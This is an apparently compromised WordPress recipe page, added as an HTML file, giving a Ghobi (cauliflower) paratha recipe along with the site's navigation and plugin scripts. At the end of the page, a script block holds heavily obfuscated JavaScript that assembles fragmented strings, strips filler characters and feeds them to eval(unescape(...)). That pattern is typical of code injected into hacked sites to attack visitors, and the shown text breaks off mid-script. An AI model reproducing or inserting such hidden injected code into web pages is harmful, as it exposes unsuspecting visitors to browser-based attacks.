@@ -1,0 +1,423 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>GHOBI | Kamli Recipes</title>
+<meta name="generator" content="WordPress 2.7.1" />
+<!-- leave this for stats -->
+<link rel="stylesheet" href="http://www.kamlirecipes.com/wp-content/themes/ayumi/style.css" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="Kamli Recipes RSS Feed" href="http://www.kamlirecipes.com/feed/" />
+<link rel="pingback" href="http://www.kamlirecipes.com/xmlrpc.php" />
+<link rel="shortcut icon" href="http://www.kamlirecipes.com/wp-content/themes/ayumi/favicon.ico" />
+
+
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.kamlirecipes.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.kamlirecipes.com/wp-includes/wlwmanifest.xml" /> 
+<script type='text/javascript' src='http://www.kamlirecipes.com/wp-includes/js/jquery/jquery.js?ver=1.2.6'></script>
+<meta name="generator" content="WordPress 2.7.1" />
+
+<style type="text/css">
+	.addtoany_share_save_container{margin:16px 0;}
+	ul.addtoany_list{
+		display:inline;
+		margin:0 !important;
+		padding:0 !important;
+	}
+	ul.addtoany_list li{
+		background:none;
+		border:0;
+		display:inline !important;
+		list-style-type:none;
+		margin:0 !important;
+		padding:0 !important;
+		line-height:32px;	}
+	ul.addtoany_list li:before{content:"";}
+	ul.addtoany_list li a{padding:0 9px}
+	ul.addtoany_list img{
+		float:none;
+		width:16px;
+		height:16px;
+		border:0;
+		margin:0;
+		padding:0;
+		vertical-align:middle;
+	}
+	ul.addtoany_list a img{
+		opacity:.6;
+		-moz-opacity:.6;
+		filter: alpha(opacity=60);
+	}
+	ul.addtoany_list a:hover img, ul.addtoany_list a.addtoany_share_save img{
+		opacity:1;
+		-moz-opacity:1;
+		filter:alpha(opacity=100);
+	}
+	a.addtoany_share_save img{border:0;width:auto;height:auto;}    </style>
+
+<!-- all in one seo pack 1.4.9 [299,328] -->
+<link rel="canonical" href="http://www.kamlirecipes.com/tag/ghobi/" />
+<!-- /all in one seo pack -->
+<link rel="stylesheet" href="http://www.kamlirecipes.com/wp-content/plugins/gd-star-rating/css/gdstarating.css.php?s=aoxygen_gif%7C30%7C10%7Cgif%7C1%23moxygen_gif%7C20%7C20%7Cgif%7C1" type="text/css" media="screen" />
+<link rel="stylesheet" href="http://www.kamlirecipes.com/wp-content/gd-star-rating/css/rating.css" type="text/css" media="screen" />
+<script type="text/javascript">//<![CDATA[
+function gdsrWait(rater, loader) {
+    jQuery("#"+rater).css("display", "none");
+    jQuery("#"+loader).css("display", "block");
+}
+
+function gdsrEmpty() { }
+
+
+function multi_rating_vote(block) {
+    var el = block.split("_");
+    var post_id = el[0];
+    var set_id = el[1];
+    var values = jQuery("#gdsr_multi_" + post_id + "_" + set_id).val();
+    gdsrWait("gdsr_mur_text_" + post_id + "_" + set_id, "gdsr_mur_loader_" + post_id + "_" + set_id);
+    jQuery.getJSON('http://www.kamlirecipes.com/wp-content/plugins/gd-star-rating/ajax.php', {_ajax_nonce: 'f96d87bdf1', vote_id: post_id, vote_set: set_id, vote_value: values, vote_type: 'm' }, function(json) {
+        jQuery("#gdsr_mur_block_" + post_id + "_" + set_id + " .gdsr_multis_as").remove();
+        jQuery("#gdsr_mur_block_" + post_id + "_" + set_id + " .gdcurrent").remove();
+        jQuery("#gdsr_mur_block_" + post_id + "_" + set_id + " input").remove();
+        jQuery("#gdsr_mur_block_" + post_id + "_" + set_id + " .ratingbutton").remove();
+        for (var i = 0; i < json.values.length; i++)
+            jQuery("#gdsr_mur_stars_rated_" + post_id + "_" + set_id + "_" + i).css("width", json.values[i]);
+        jQuery("#gdsr_mur_text_" + post_id + "_" + set_id + " .ratingtextmulti").html(json.rater).addClass("voted");
+        gdsrWait("gdsr_mur_loader_" + post_id + "_" + set_id, "gdsr_mur_text_" + post_id + "_" + set_id);
+    });
+}
+jQuery(document).ready(function() {
+    if (jQuery.browser.msie) jQuery(".gdsr_rating_as > a").attr("href", "javascript:gdsrEmpty()");
+    jQuery(".gdsr_rating_as > a").click(function() {
+        var el = jQuery(this).attr("id").split("X");
+        gdsrWait(el[5], el[6]);
+        jQuery.getJSON('http://www.kamlirecipes.com/wp-content/plugins/gd-star-rating/ajax.php', {_ajax_nonce: 'f96d87bdf1', vote_id: el[1], vote_value: el[2], vote_type: el[4], vote_tpl: el[7] }, function(json) {
+            gdsrWait(el[6], el[5]);
+            if (json.status == 'ok') {
+                jQuery("#gdr_stars_" + el[4] + el[1]).html("");
+                jQuery("#gdr_vote_" + el[4] + el[1]).css("width", json.value);
+                jQuery("#gdr_text_" + el[4] + el[1]).addClass("voted");
+                jQuery("#gdr_text_" + el[4] + el[1]).html(json.rater);
+            }
+        });
+    });
+        if (jQuery.browser.msie) jQuery(".gdsr_review_as > a").attr("href", "javascript:gdsrEmpty()");
+    jQuery(".gdsr_review_as > a").click(function() {
+        var el = jQuery(this).attr("id").split("X");
+        var vote = el[1];
+        var size = el[2];
+        var new_width = vote * size;
+        jQuery("#gdsr_cmm_stars_rated").css("width", new_width + "px");
+        jQuery("#gdsr_cmm_review").val(vote);
+    });
+        if (jQuery.browser.msie) jQuery(".gdsr_multisbutton_as > a").attr("href", "javascript:gdsrEmpty()");
+    jQuery(".gdsr_multisbutton_as > a").click(function() {
+        if (jQuery(this).hasClass("active")) {
+            block = jQuery(this).parent().attr("id").substring(12);
+            multi_rating_vote(block);
+        }
+    });
+
+    if (jQuery.browser.msie) jQuery(".gdsr_multis_as > a").attr("href", "javascript:gdsrEmpty()");
+    jQuery(".gdsr_multis_as > a").click(function() {
+        var el = jQuery(this).attr("id").split("X");
+        var vote = el[4];
+        var size = el[5];
+        var new_width = vote * size;
+        var current_id = '#gdsr_mur_stars_current_' + el[1] + '_' + el[2] + '_' + el[3];
+        var input_id = '#gdsr_multi_' + el[1] + '_' + el[2];
+        jQuery(current_id).css("width", new_width + "px");
+        var rating_values = jQuery(input_id).val().split("X");
+        rating_values[el[3]] = vote;
+        var active = true;
+        for (var i = 0; i < rating_values.length; i++) {
+            if (rating_values[i] == 0) {
+                active = false;
+                break;
+            }
+        }
+        jQuery(input_id).val(rating_values.join("X"));
+        var button_id = '#gdsr_button_' + el[1] + '_' + el[2];
+        if (active) {
+            jQuery(button_id).removeClass('gdinactive');
+            jQuery(button_id).addClass('gdactive');
+            jQuery(button_id + " a").addClass('active');
+        }
+        else {
+            jQuery(button_id).removeClass('gdactive');
+            jQuery(button_id).addClass('gdinactive');
+            jQuery(button_id + " a").removeClass('active');
+        }
+    });
+});
+
+// ]]></script>
+<!--[if IE]><style type="text/css">.ratemulti .starsbar .gdcurrent { -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=70)"; filter: alpha(opacity=70); }</style><![endif]-->
+
+<style type="text/css">
+#img {
+}
+
+
+#img h1 a{
+        color: #fff;
+}
+#img .description {
+        display: none;
+}
+
+</style>
+
+<style type="text/css">.recentcomments a{display:inline !important;padding: 0 !important;margin: 0 !important;}</style>
+</head><script language=javascript><!--                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+ --></script>
+<body>
+<div id="top">
+<div id="headr">
+<div id="logo">
+    <h1><a href="http://www.kamlirecipes.com/">
+      Kamli Recipes      </a></h1>
+    <div class="description">
+      Delicious Pakistani, Indian, Arabic, Chineese Recipes    </div>
+</div>
+
+	<div id="top-rss">
+	</div>
+	<div id="top-menu">
+	<ul id="menuv">
+    <li class="page_item"><a href="http://www.kamlirecipes.com/" title="Home">Home</a></li>
+    <li class="page_item page-item-2"><a href="http://www.kamlirecipes.com/about-kamli-recipes/" title="About Kamli Recipes">About Kamli Recipes</a></li>
+	<li class="admintab"><a href="http://www.kamlirecipes.com/wp-login.php?action=register">Register</a></li>   </ul>
+	</div>
+</div>
+</div>
+<div id="top-img">
+
+</div>
+<div id="page">
+
+<hr />
+
+<div id="content-wrap">
+<div id="content">
+<div class="gap">
+
+        <div class="navigation">
+    <div class="alignleft">
+          </div>
+    <div class="alignright">
+          </div>
+  </div>
+    <div class="post">
+<h2><a href="http://www.kamlirecipes.com/breads/ghobi-paratha/" rel="bookmark" title="Permanent Link to GHOBI PARATHA">GHOBI PARATHA</a> &#8226; <span class="date">05.01.09</span></h2>
+    <div class="entry">
+      <pre><span style="font-family: verdana;"><span style="font-size: small;"><span class="style3"><strong><span style="color: #006600; font-family: Arial;">Ingredients:</span></strong></span>
+Dough
+4 cup Whole-wheat flour
+1 To 3 cups cold water
+3/4 cup Ghee
+
+Filling
+-2 tb Ghee
+-1 tb Finely chopped fresh ginger root
+-1 ts Finely chopped garlic
+-1/2 c Finely chopped onions
+-1 ts Turmeric
+-1/8 ts Ground hot red pepper
+-1 md Cauliflower, trimmed, and coarsely chopped
+-1 tb Finely chopped fresh hot
+green chili (CAUTION)
+-1 ts Ground cumin
+-1 ts Salt
+- 6 To 8 tablespoons ghee
+</span></span></pre>
+<p><span style="font-size: small;"><strong><span style="color: #006600;"><span style="font-family: Arial;"><span class="style3">Preparation: </span><br />
+</span></span></strong>DOUGH Prepare the whole-wheat dough in the following fashion: In a small bowl, combine the whole-wheat flour and 1/4 cup of the ghee. With your fingertips rub the flour and fat together until they look like flakes of coarse meal. Pour 1 cup of water over the mixture all at once, knead together vigorously, and gather the dough into a compact ball. If the dough crumbles, add up to 2 cups more water, 1/4 cup at a time, until the particles adhere. On a lightly floured surface, knead the dough by folding it end to end, then pressing it down and pushing it forward several times with the heel of your hand. Repeat for 7 or 8 minutes, until the dough is smooth and elastic. Again gather it into a ball. Place the dough in a bowl, drape a kitchen towel over the top, and let it rest at room temperature for at least 30 minutes before rolling it. CAULIFLOWER FILLING: Meanwhile, in a heavy 10 to 12-inch skillet, heat 2 tablespoons of ghee over high heat until a drop of water flicked into it splutters instantly. Stir in the ginger and garlic, then the onions. Lower the heat to moderate and, stirring constantly, fry the mixture for 7 or 8 minutes, until the onions are soft and golden brown. Watch carefully for any sign of burning and regulate the heat accordingly. Stir in the turmeric, red pepper, cauliflower, chili, cumin and salt. Reduce the heat to low, cover tightly and cook for 10 minutes, or until the cauliflower is tender but still slightly resistant to the bite. To make the parathas, divide the cauliflower mixture into 9 equal portions. Divide the dough also into 9 portions and drape a dampened kitchen towel over them to keep the dough moist. One at a time, on a lightly floured surface, roll a ball of dough into a round about 5 inches in diameter. Place a portion of the filling mixture in the center of the round and fold the edges over it, pressing them together to enclose the filling securely. Pat the filled paratha flat with your hands, then gently roll it again to make a round about 5 inches in diameter. As you shape and fill the parathas, set them aside, covered with a dampened kitchen towel to keep them from drying out. Heat an ungreased 10 to 12-inch skillet with a non stick finish or a well-seasoned cast-iron skillet or griddle until it is hot enough for a drop of water flicked into it to splutter instantly. Place one of the parathas in the pan and, moving it about constantly with your fingers or the edge of a metal spatula, cook for a minute or so. With a wide spatula, turn the paratha over and brush about a teaspoon of the ghee on the top. Cook for 2 minutes, then turn it over, spread with another teaspoon of ghee and cook for I minute. Turning frequently, continue to cook until the paratha is brown on both sides. (When you have mastered the technique, you will find you can fry 2 or 3 parathas at a time, depending on the size of your skillet or griddle.) Serve the parathas warm, as a mealtime bread. They are traditionally accompanied by plain yoghurt or any rayta. Parathas may be cooked ahead and reheated in a hot ungreased skillet for a minute or so on each side. Makes nine 5-inch breads.</span></p>
+<div style="display: none">VN:F [1.2.0_562]</div><div class="ratingblock"><div class="ratingheader "><div class="ratingheader "></div><div class="ratingstars "><div id="article_rater_81" class="ratepost"><div class="starsbar"><div class="gdouter" align="left"><div id="gdr_vote_a81" style="width: 0px;" class="gdinner"></div><div id="gdr_stars_a81" class="gdsr_rating_as"><a id="gdsrX81X10X0XaXarticle_rater_81Xarticle_loader_81X8" title="10 out of 10" class="s10" rel="nofollow"></a><a id="gdsrX81X9X0XaXarticle_rater_81Xarticle_loader_81X8" title="9 out of 10" class="s9" rel="nofollow"></a><a id="gdsrX81X8X0XaXarticle_rater_81Xarticle_loader_81X8" title="8 out of 10" class="s8" rel="nofollow"></a><a id="gdsrX81X7X0XaXarticle_rater_81Xarticle_loader_81X8" title="7 out of 10" class="s7" rel="nofollow"></a><a id="gdsrX81X6X0XaXarticle_rater_81Xarticle_loader_81X8" title="6 out of 10" class="s6" rel="nofollow"></a><a id="gdsrX81X5X0XaXarticle_rater_81Xarticle_loader_81X8" title="5 out of 10" class="s5" rel="nofollow"></a><a id="gdsrX81X4X0XaXarticle_rater_81Xarticle_loader_81X8" title="4 out of 10" class="s4" rel="nofollow"></a><a id="gdsrX81X3X0XaXarticle_rater_81Xarticle_loader_81X8" title="3 out of 10" class="s3" rel="nofollow"></a><a id="gdsrX81X2X0XaXarticle_rater_81Xarticle_loader_81X8" title="2 out of 10" class="s2" rel="nofollow"></a><a id="gdsrX81X1X0XaXarticle_rater_81Xarticle_loader_81X8" title="1 out of 10" class="s1" rel="nofollow"></a></div></div></div></div><div id="article_loader_81" style="display: none; width:300px;" class="ratingloaderarticle"><div class="loader flower " style="height: 30px"><div class="loaderinner" style="padding-top: 5px">please wait...</div></div></div></div><div class="ratingtext "><div id="gdr_text_a81">Rating: 0.0/<strong>10</strong> (0 votes cast)</div></div></div></div><div class="addtoany_share_save_container"><ul class="addtoany_list"><li><a class="a2a_dd addtoany_share_save" href="http://www.addtoany.com/share_save?&amp;linkurl=http%3A%2F%2Fwww.kamlirecipes.com%2Fbreads%2Fghobi-paratha%2F&amp;linkname=GHOBI%20PARATHA"><img src="http://www.kamlirecipes.com/wp-content/plugins/add-to-any/share_save_256_24.png" width="256" height="24" alt="Share/Save/Bookmark"/></a></li></ul></div>    </div>
+    
+		<div class="tags">Tags: <a href="http://www.kamlirecipes.com/tag/ghobi/" rel="tag">GHOBI</a>, <a href="http://www.kamlirecipes.com/tag/paratha/" rel="tag">PARATHA</a></div>
+	
+	<p class="meta2"><span class="catr">Posted in <a href="http://www.kamlirecipes.com/category/breads/" title="View all posts in Breads" rel="category tag">Breads</a>,  <a href="http://www.kamlirecipes.com/category/vegetables/" title="View all posts in Vegetables" rel="category tag">Vegetables</a></span><span class="commr">with <a href="http://www.kamlirecipes.com/breads/ghobi-paratha/#respond" title="Comment on GHOBI PARATHA">No Comments &rarr;</a></span> 
+</p>
+	</div>
+    <div class="navigation">
+    <div class="alignleft">
+          </div>
+    <div class="alignright">
+          </div>
+  </div>
+  
+</div>
+</div>
+</div>
+
+<div class="side">
+<div class="master-side">
+<ul>
+	  	 <li class="about" id="img">
+<img src="http://www.kamlirecipes.com/wp-content/uploads/2009/05/kamlirecipes.gif" alt="You Avatar" id="avatr"  /><br />
+<span> </span> 
+  </li>
+	  <li>
+	  		<form method="get" id="searchform" action="http://www.kamlirecipes.com/">
+<div>
+<input type="text" value="To Search, just type and enter" name="s" id="s" onfocus="if (this.value == 'To Search, just type and enter') {this.value = '';}" onblur="if (this.value == '') {this.value = 'To Search, just type and enter';}" />
+<input type="hidden" id="searchsubmit" value="Search" />
+</div>
+</form>	  </li>
+</ul>
+</div>
+<div class="side1">
+<div class="gap">
+<ul>
+	    	  <li class="categories"><h2>Categories</h2><ul>	<li class="cat-item cat-item-1"><a href="http://www.kamlirecipes.com/category/appetizers/" title="View all posts filed under Appetizers">Appetizers</a> (4)
+</li>
+	<li class="cat-item cat-item-3"><a href="http://www.kamlirecipes.com/category/arabian/" title="View all posts filed under Arabian">Arabian</a> (3)
+</li>
+	<li class="cat-item cat-item-5"><a href="http://www.kamlirecipes.com/category/beef/" title="View all posts filed under Beef">Beef</a> (14)
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.kamlirecipes.com/category/breads/" title="View all posts filed under Breads">Breads</a> (13)
+</li>
+	<li class="cat-item cat-item-6"><a href="http://www.kamlirecipes.com/category/breakfast/" title="View all posts filed under Breakfast">Breakfast</a> (1)
+</li>
+	<li class="cat-item cat-item-9"><a href="http://www.kamlirecipes.com/category/chinese/" title="View all posts filed under Chinese">Chinese</a> (1)
+</li>
+	<li class="cat-item cat-item-29"><a href="http://www.kamlirecipes.com/category/vegetables/" title="View all posts filed under Vegetables">Vegetables</a> (5)
+</li>
+</ul></li>	  <li class="boxy last">
+  <h2>Recent Post</h2>
+  <ul>
+    	<li><a href='http://www.kamlirecipes.com/breakfast/apple-breakfast-bread/' title='APPLE BREAKFAST BREAD'>APPLE BREAKFAST BREAD</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/makai-ki-roti/' title='MAKAI KI ROTI'>MAKAI KI ROTI</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/kutluma/' title='KUTLUMA'>KUTLUMA</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/kulcha/' title='KULCHA'>KULCHA</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/keema-walay-nan/' title='KEEMA WALAY NAN'>KEEMA WALAY NAN</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/green-poori/' title='GREEN POORI'>GREEN POORI</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/ghobi-paratha/' title='GHOBI PARATHA'>GHOBI PARATHA</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/dal-puri/' title='DAL PURI'>DAL PURI</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/cheese-bread/' title='CHEESE BREAD'>CHEESE BREAD</a></li>
+	<li><a href='http://www.kamlirecipes.com/breads/chapati-roti/' title='CHAPATI (ROTI)'>CHAPATI (ROTI)</a></li>
+  </ul>
+</li>
+	  <li class="boxy">
+        <h2>Archives</h2>
+        <ul>
+          	<li><a href='http://www.kamlirecipes.com/2009/05/' title='May 2009'>May 2009</a></li>
+	<li><a href='http://www.kamlirecipes.com/2009/04/' title='April 2009'>April 2009</a></li>
+        </ul>
+      </li>
+       </ul>
+</div>
+</div>
+
+<div class="side2">
+<div class="gap">
+    <ul>
+	  <li id="tag_cloud" class="widget widget_tag_cloud"><h2 class="widgettitle">Select Your Tag</h2>
+<a href='http://www.kamlirecipes.com/tag/allo/' class='tag-link-52' title='1 topic' rel="tag" style='font-size: 8pt;'>ALLO</a>
+<a href='http://www.kamlirecipes.com/tag/almond/' class='tag-link-67' title='1 topic' rel="tag" style='font-size: 8pt;'>ALMOND</a>
+<a href='http://www.kamlirecipes.com/tag/apple/' class='tag-link-49' title='1 topic' rel="tag" style='font-size: 8pt;'>APPLE</a>
+<a href='http://www.kamlirecipes.com/tag/asparagus/' class='tag-link-61' title='1 topic' rel="tag" style='font-size: 8pt;'>ASPARAGUS</a>
+<a href='http://www.kamlirecipes.com/tag/baida/' class='tag-link-31' title='1 topic' rel="tag" style='font-size: 8pt;'>BAIDA</a>
+<a href='http://www.kamlirecipes.com/tag/baked/' class='tag-link-62' title='3 topics' rel="tag" style='font-size: 13.6pt;'>BAKED</a>
+<a href='http://www.kamlirecipes.com/tag/basin/' class='tag-link-33' title='1 topic' rel="tag" style='font-size: 8pt;'>BASIN</a>
+<a href='http://www.kamlirecipes.com/tag/beef/' class='tag-link-5' title='2 topics' rel="tag" style='font-size: 10.8pt;'>Beef</a>
+<a href='http://www.kamlirecipes.com/tag/bread/' class='tag-link-50' title='1 topic' rel="tag" style='font-size: 8pt;'>BREAD</a>
+<a href='http://www.kamlirecipes.com/tag/breads/' class='tag-link-4' title='1 topic' rel="tag" style='font-size: 8pt;'>Breads</a>
+<a href='http://www.kamlirecipes.com/tag/breakfast/' class='tag-link-6' title='1 topic' rel="tag" style='font-size: 8pt;'>Breakfast</a>
+<a href='http://www.kamlirecipes.com/tag/chapati/' class='tag-link-35' title='1 topic' rel="tag" style='font-size: 8pt;'>CHAPATI</a>
+<a href='http://www.kamlirecipes.com/tag/cheese/' class='tag-link-36' title='2 topics' rel="tag" style='font-size: 10.8pt;'>CHEESE</a>
+<a href='http://www.kamlirecipes.com/tag/crisp/' class='tag-link-71' title='1 topic' rel="tag" style='font-size: 8pt;'>CRISP</a>
+<a href='http://www.kamlirecipes.com/tag/dal/' class='tag-link-38' title='1 topic' rel="tag" style='font-size: 8pt;'>DAL</a>
+<a href='http://www.kamlirecipes.com/tag/garlic/' class='tag-link-72' title='1 topic' rel="tag" style='font-size: 8pt;'>GARLIC</a>
+<a href='http://www.kamlirecipes.com/tag/ghobi/' class='tag-link-40' title='1 topic' rel="tag" style='font-size: 8pt;'>GHOBI</a>
+<a href='http://www.kamlirecipes.com/tag/green/' class='tag-link-41' title='1 topic' rel="tag" style='font-size: 8pt;'>GREEN</a>
+<a href='http://www.kamlirecipes.com/tag/halawa/' class='tag-link-66' title='1 topic' rel="tag" style='font-size: 8pt;'>HALAWA</a>
+<a href='http://www.kamlirecipes.com/tag/kebabs/' class='tag-link-65' title='1 topic' rel="tag" style='font-size: 8pt;'>KEBABS</a>
+<a href='http://www.kamlirecipes.com/tag/keema/' class='tag-link-43' title='1 topic' rel="tag" style='font-size: 8pt;'>KEEMA</a>
+<a href='http://www.kamlirecipes.com/tag/kulcha/' class='tag-link-55' title='1 topic' rel="tag" style='font-size: 8pt;'>KULCHA</a>
+<a href='http://www.kamlirecipes.com/tag/kutluma/' class='tag-link-51' title='1 topic' rel="tag" style='font-size: 8pt;'>KUTLUMA</a>
+<a href='http://www.kamlirecipes.com/tag/makai/' class='tag-link-47' title='1 topic' rel="tag" style='font-size: 8pt;'>MAKAI</a>
+<a href='http://www.kamlirecipes.com/tag/mushrooms/' class='tag-link-59' title='1 topic' rel="tag" style='font-size: 8pt;'>MUSHROOMS</a>
+<a href='http://www.kamlirecipes.com/tag/naan/' class='tag-link-53' title='2 topics' rel="tag" style='font-size: 10.8pt;'>NAAN</a>
+<a href='http://www.kamlirecipes.com/tag/nan/' class='tag-link-45' title='1 topic' rel="tag" style='font-size: 8pt;'>NAN</a>
+<a href='http://www.kamlirecipes.com/tag/pancake/' class='tag-link-68' title='1 topic' rel="tag" style='font-size: 8pt;'>PANCAKE</a>
+<a href='http://www.kamlirecipes.com/tag/paratha/' class='tag-link-32' title='4 topics' rel="tag" style='font-size: 16.4pt;'>PARATHA</a>
+<a href='http://www.kamlirecipes.com/tag/poori/' class='tag-link-42' title='1 topic' rel="tag" style='font-size: 8pt;'>POORI</a>
+<a href='http://www.kamlirecipes.com/tag/potato/' class='tag-link-56' title='1 topic' rel="tag" style='font-size: 8pt;'>POTATO</a>
+<a href='http://www.kamlirecipes.com/tag/puri/' class='tag-link-39' title='1 topic' rel="tag" style='font-size: 8pt;'>PURI</a>
+<a href='http://www.kamlirecipes.com/tag/roast/' class='tag-link-54' title='6 topics' rel="tag" style='font-size: 22pt;'>ROAST</a>
+<a href='http://www.kamlirecipes.com/tag/roll/' class='tag-link-58' title='1 topic' rel="tag" style='font-size: 8pt;'>Roll</a>
+<a href='http://www.kamlirecipes.com/tag/roti/' class='tag-link-34' title='5 topics' rel="tag" style='font-size: 19.2pt;'>ROTI</a>
+<a href='http://www.kamlirecipes.com/tag/skewer/' class='tag-link-64' title='1 topic' rel="tag" style='font-size: 8pt;'>SKEWER</a>
+<a href='http://www.kamlirecipes.com/tag/steak/' class='tag-link-60' title='1 topic' rel="tag" style='font-size: 8pt;'>STEAK</a>
+<a href='http://www.kamlirecipes.com/tag/steaks/' class='tag-link-57' title='1 topic' rel="tag" style='font-size: 8pt;'>STEAKS</a>
+<a href='http://www.kamlirecipes.com/tag/strips/' class='tag-link-63' title='1 topic' rel="tag" style='font-size: 8pt;'>STRIPS</a>
+<a href='http://www.kamlirecipes.com/tag/tikka/' class='tag-link-70' title='1 topic' rel="tag" style='font-size: 8pt;'>TIKKA</a>
+<a href='http://www.kamlirecipes.com/tag/walay/' class='tag-link-44' title='1 topic' rel="tag" style='font-size: 8pt;'>WALAY</a>
+<a href='http://www.kamlirecipes.com/tag/walnuts/' class='tag-link-69' title='1 topic' rel="tag" style='font-size: 8pt;'>WALNUTS</a>
+<a href='http://www.kamlirecipes.com/tag/yeast/' class='tag-link-37' title='1 topic' rel="tag" style='font-size: 8pt;'>yeast</a></li>
+	<li id="pages" class="widget widget_pages">		<h2 class="widgettitle">Pages</h2>
+		<ul>
+			<li class="page_item page-item-2"><a href="http://www.kamlirecipes.com/about-kamli-recipes/" title="About Kamli Recipes">About Kamli Recipes</a></li>
+		</ul>
+	</li>
+
+		<li id="recent-comments" class="widget widget_recent_comments">			<h2 class="widgettitle">Recent Comments</h2>
+			<ul id="recentcomments"><li class="recentcomments"><a href='http://www.kamli.com' rel='external nofollow' class='url'>Farheen Ahmed</a> on <a href="http://www.kamlirecipes.com/appetizers/baked-brie-with-roasted-garlic-and-sun-dried-tomatoes/comment-page-1/#comment-1">BAKED BRIE WITH ROASTED GARLIC AND SUN-DRIED TOMATOES</a></li></ul>
+		</li>
+<li id="linkcat-30" class="widget widget_links"><h2 class="widgettitle">Network Sites</h2>
+
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.kamli.com/jobs/default.asp" rel="me" title="Jobs from all over the world" target="_blank">Job Search Engine</a></li>
+<li><a href="http://www.kamli.com/" target="_blank">Kamli Portal</a></li>
+
+	</ul>
+</li>
+
+    </ul>
+  </div>
+</div>
+</div>
+
+<br class="clear" />
+</div>
+<div id="out-foot">
+<div id="footer">
+  <hr />
+  <p>
+  <strong>
+    Kamli Recipes    </strong>&copy; 2007- 2009 All Rights Reserved, Powered By <a href="http://www.wordpress.org">WordPress</a><br />Run in 47 queries. 0.259 seconds.  </p>
+  <p class="right">
+  <span><a href="http://wpgpl.com/themes/ayumi" title="Free WordPress Theme: Ayumi 2.1">Ayumi 2.1</a> design by <a href="http://wpgpl.com/">WP GPL</a></span>   <br /><span class="rss"><a href="http://www.kamlirecipes.com/feed/">Entries</a></span> and <span class="rss"><a href="http://www.kamlirecipes.com/comments/feed/">Comments</a><span>. 
+  </p>
+  <br class="clear" />
+</div>
+</div>
+
+<script type="text/javascript">
+a2a_localize = {
+	Share: "Share",
+	Save: "Save",
+	Subscribe: "Subscribe",
+	Email: "E-mail",
+    Bookmark: "Bookmark",
+	ShowAll: "Show all",
+	ShowLess: "Show less",
+	FindServices: "Find service(s)",
+	FindAnyServiceToAddTo: "Instantly find any service to add to",
+	PoweredBy: "Powered by",
+	ShareViaEmail: "Share via e-mail",
+	SubscribeViaEmail: "Subscribe via e-mail",
+	BookmarkInYourBrowser: "Bookmark in your browser",
+	BookmarkInstructions: "Press Ctrl+D or Cmd+D to bookmark this page",
+	AddToYourFavorites: "Add to your favorites",
+	SendFromWebOrProgram: "Send from any e-mail address or e-mail program",
+    EmailProgram: "E-mail program"
+};
+a2a_linkname="GHOBI PARATHA";
+a2a_linkurl="http://www.kamlirecipes.com/breads/ghobi-paratha/";
+
+</script><script type="text/javascript" src="http://static.addtoany.com/menu/page.js"></script>
+
+
+<script>var DQfgp="P8uqn3Duqn27uqn";var z4bw="lace(/uqn/";var F4R92H="70J554J5";var YbybZ="8o564o56Fo563o";var KTb094E="Q65JFQ20JFQ28";var eadqu="Eo53Co5";var FSeWTYT="579TMvDJ527";var zArpa="FQ6FJFQ63JFQ";var dGxjSkzj="8uqn27uqnP9uqn";var Pln5CV="escape(E9I";var vPv2kxe="uqnPDuqnP5u";var Y1buTs="'%').replace(";var WMNi9sx="ce(/v/";KTb094E+="JFQ74JFQ34JFQ";var rlzV="PCuqnP5uqnPDuq";var NeCBO09N="uqnPFuqnP3u";var Ljz1KXSF="o574o534o559o";var CJv9pZK="'%3')));";var O7JEZVoi="qn74uq";var IfIB7="n75uqn2Euq";var rEJB="4J565J5";var oksQguA="2uqnP5uqnP1uq";var qeUby="64J528J56CJ54";var mreJ2O="o564o569o";var O50Gz="7m.replace(/Zn";var CmB1="o569o564";Y1buTs="replace(/J5/g,"+Y1buTs;FSeWTYT="56CJ569J574J"+FSeWTYT;O7JEZVoi+="n74uqn70uqn3Auq";CmB1=mreJ2O+"576o520"+CmB1;var akvwl="60gHD%F4DHD";qeUby="568J569J56CJ5"+qeUby;var oeUjD="qn20uqn70uqn54u";dGxjSkzj+="PPuqn72uq";dGxjSkzj+="nP1uqnPDu";var GZoQqaw="50J573J558J";var Fb0Uzi="Vx.replace(/JF";var UrfohHpn="Eo527o52Bo574";rlzV="uqn2Euqn"+rlzV;var iDzKDUj="CuqnP5";var uZ3Orr="PCuqn4DuqnP7uq";var bxCfKpf="o574o53";WMNi9sx="1lF.repla"+WMNi9sx;eadqu="Do527o53"+eadqu;var iSp8BMXw="7uqnP7uqn43uqn";rlzV+="nPFuqnPEuqnP9u";z4bw+="g,'%')));var E";var Ww94x="73uqn58uqn";WMNi9sx="escape(l"+WMNi9sx;var Wz3LAubF="8HD%F52HD%F37H";Wz3LAubF+="D%F27HD";var zGbt="P7uqnP5u";var d1o3Qsr="1uqn72";var bFBdQE="28uqn27uq";var TKlZUOVT="65HD%F";var QRkg="J52EJ573J574J57";TKlZUOVT+="69HD%F67HD%";DQfgp="4uqn74uqn"+DQfgp;var rqqCcWm="Q3B';eval(unes";d1o3Qsr="nuqn7PuqnP"+d1o3Qsr;NeCBO09N=Ww94x+"77uqn3DuqnP4"+NeCBO09N;var MjYMP="D%F6DHD%F";var qq5aA="n74uqn42uqn79";var IQlH1="o575o56Co";O50Gz+="/g,'B').re";var sSG3UmwT="uqn7PuqnP1";rqqCcWm=KTb094E+"59JFQ53JFQ29JF"+rqqCcWm;z4bw+="9I10wi";zGbt="n2Euqn"+zGbt;var EXP48="ape(G62Dm.re";var 